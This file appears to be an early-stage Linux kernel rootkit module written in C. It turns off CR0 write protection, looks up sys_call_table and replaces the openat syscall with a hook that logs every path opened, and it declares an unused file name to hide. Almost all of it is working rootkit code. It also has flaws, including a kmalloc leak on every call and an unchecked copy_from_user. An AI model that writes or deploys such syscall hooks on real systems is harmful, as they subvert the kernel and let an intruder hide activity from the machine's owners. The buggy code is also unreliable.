#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/limits.h>
#include <stdbool.h>

// Types & other consts.
# define PROC_SYS_TYPE 0x9fa0
typedef int (*original_openat_t)(const struct pt_regs *regs);
static original_openat_t original_openat_ptr;
static unsigned long *syscall_table; 
static char *file_name_to_hide = "14628";
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

int new_openat(const struct pt_regs *regs) {
    void *path_name_pointer = (void *)regs->si;
    char *path;
    path = kmalloc(PATH_MAX, GFP_KERNEL);

    copy_from_user((void *)path, path_name_pointer, PATH_MAX);
    printk(KERN_ALERT "Path: %s", path);
    return original_openat_ptr(regs);
}
 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    original_openat_ptr = (original_openat_t)syscall_table[__NR_openat];
    syscall_table[__NR_openat] = (unsigned long)new_openat;
    printk(KERN_ALERT "Overrided openat ptr!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    syscall_table[__NR_openat] = (unsigned long)original_openat_ptr;  
    printk(KERN_ALERT "openat has been restored!");
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");